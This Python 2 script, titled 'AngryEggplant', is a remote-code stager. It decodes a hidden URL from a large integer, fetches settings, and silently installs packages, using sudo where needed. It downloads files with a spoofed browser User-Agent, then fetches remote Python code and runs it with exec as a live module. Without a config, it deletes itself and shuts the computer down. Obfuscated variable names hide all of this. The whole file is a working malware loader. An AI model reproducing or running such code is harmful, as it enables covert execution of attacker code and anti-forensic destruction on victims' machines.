#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import imp
import requests

#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88


https://github.com/colental/AngryEggplant

'''


def run(config=None):
    if not config:
       os.remove(__file__) or os.remove(sys.argv[0])
       os.system('shutdown /s /t 1' if os.name is 'nt' else 'shutdown --poweroff --no-wall')
       sys.exit(0)
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(x).strip('0x').strip('L')))
    AccidentalAquaticCactus = requests.get(SomberUnbecomingAmusement(config)).json()
    AccidentalAquaticCactus['settings']['f'] = globals().get('__file__') or sys.argv[0]
    ReflectiveTightfistedTrapezoid = int(AccidentalAquaticCactus['settings'].get('v'))
    try:
        GroovySophisticatedLemur = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
        if not len(GroovySophisticatedLemur):
            exec requests.get(SomberUnbecomingAmusement(long(AccidentalAquaticCactus['settings'].get('y')))).content in globals()
            exec requests.get(SomberUnbecomingAmusement(long(AccidentalAquaticCactus['settings'].get('x')))).content in globals()
        BloatedLionProlapse = lambda x: os.popen(' '.join(['{}'.format(i) for i in x])).read().rstrip()
        for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(requests.utils.struct.calcsize('P') * 8)].items():
            GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse([GroovySophisticatedLemur, 'install', NobleRusticWalrus])    
            if not len(BloatedLionProlapse([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
                    fp.write(requests.get(NobleRusticWalrus, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17025', 'Referer':'https://www.lfd.uci.edu/~gohlke/pythonlibs/'}).content)
                GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', os.path.basename(NobleRusticWalrus)])
            ChivalrousIntergalacticPlayboy = os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
    finally:
        imports = requests.get(SomberUnbecomingAmusement(long(AccidentalAquaticCactus['settings'].get('w')))).content
        uri     = SomberUnbecomingAmusement(long(AccidentalAquaticCactus['settings'].get('u')))
        name    = os.path.splitext(os.path.basename(uri))[0]
        module  = imp.new_module(name)
        source  = '\n\n'.join([imports, requests.get(uri).content])
        code    = compile(source, name, 'exec')
        exec code in module.__dict__
        globals()[name]     = module
        sys.modules[name]   = module
        return module.main(**AccidentalAquaticCactus['settings'])

def main():
    config = 5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950
    print bytes(bytearray.fromhex(hex(long(config)).strip('0x').strip('L')))
    return run(config)

if __name__ == '__main__':
    main()
